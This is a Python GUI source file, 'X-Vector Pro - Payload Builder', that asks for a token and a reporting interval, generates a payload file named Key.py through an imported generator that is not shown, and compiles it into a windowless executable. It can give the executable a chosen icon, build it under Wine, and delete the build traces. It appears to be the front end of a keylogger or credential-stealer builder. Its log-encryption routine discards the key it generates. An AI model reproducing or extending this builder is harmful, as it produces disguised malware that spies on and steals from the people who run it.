import customtkinter as ctk
import os
from subprocess import call
from datetime import datetime
from cryptography.fernet import Fernet
from Utils.generator import build_t

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class XVectorGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("X-Vector Pro - Payload Builder")
        self.geometry("720x500")
        self.icon_path = None

        # Inputs
        self.token_entry = ctk.CTkEntry(self, placeholder_text="Enter Token")
        self.token_entry.pack(pady=10)

        self.interval_entry = ctk.CTkEntry(self, placeholder_text="Enter Time Interval (minutes)")
        self.interval_entry.pack(pady=10)

        # Buttons
        ctk.CTkButton(self, text="Generate Payload", command=self.generate_payload).pack(pady=5)
        ctk.CTkButton(self, text="Compile for Windows", command=self.compile_windows).pack(pady=5)
        ctk.CTkButton(self, text="Compile with Icon", command=self.compile_with_icon).pack(pady=5)
        ctk.CTkButton(self, text="Compile for Linux (Wine)", command=self.compile_linux).pack(pady=5)
        ctk.CTkButton(self, text="Encrypt Log", command=self.encrypt_log).pack(pady=5)

        # Log output
        self.log_box = ctk.CTkTextbox(self, width=680, height=200)
        self.log_box.pack(pady=10)

    def log(self, msg):
        timestamp = f"[{datetime.now()}]"
        self.log_box.insert("end", f"{timestamp} {msg}\n")
        self.log_box.see("end")

    def generate_payload(self):
        token = self.token_entry.get()
        interval = self.interval_entry.get()
        if not token or not interval:
            self.log("Token and interval required.")
            return
        try:
            build_t(token, interval)
            self.log("Payload generated: Key.py")
        except Exception as e:
            self.log(f"Error generating payload: {e}")

    def compile_windows(self):
        self._compile_cmd("pyinstaller --onefile --noconsole Key.py", clear="cls")

    def compile_with_icon(self):
        from tkinter import filedialog
        self.icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if self.icon_path:
            cmd = f"pyinstaller --onefile --noconsole --icon={self.icon_path} Key.py"
            self._compile_cmd(cmd, clear="cls")

    def compile_linux(self):
        pyinstaller_path = os.path.expanduser("~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe")
        cmd = ["wine", pyinstaller_path, "--onefile", "--noconsole", "Key.py"]
        try:
            call(cmd)
            self.log("Linux payload compiled with Wine.")
            self.cleanup()
        except Exception as e:
            self.log(f"Linux compile error: {e}")

    def encrypt_log(self):
        try:
            with open("xvector_log.txt", "r") as f:
                data = f.read()
            key = Fernet.generate_key()
            cipher = Fernet(key)
            encrypted = cipher.encrypt(data.encode())
            with open("xvector_encrypted.log", "wb") as f:
                f.write(encrypted)
            self.log("Log encrypted: xvector_encrypted.log")
        except Exception as e:
            self.log(f"Encryption failed: {e}")

    def _compile_cmd(self, cmd, clear=None):
        try:
            os.system(cmd)
            self.cleanup()
            if clear:
                os.system(clear)
            self.log("Compilation done.")
        except Exception as e:
            self.log(f"Compile error: {e}")

    def cleanup(self):
        for f in ["Key.py", "Key.spec"]:
            try: os.remove(f)
            except: pass
        for d in ["__pycache__", "build"]:
            try: import shutil; shutil.rmtree(d, ignore_errors=True)
            except: pass


if __name__ == "__main__":
    app = XVectorGUI()
    app.mainloop()
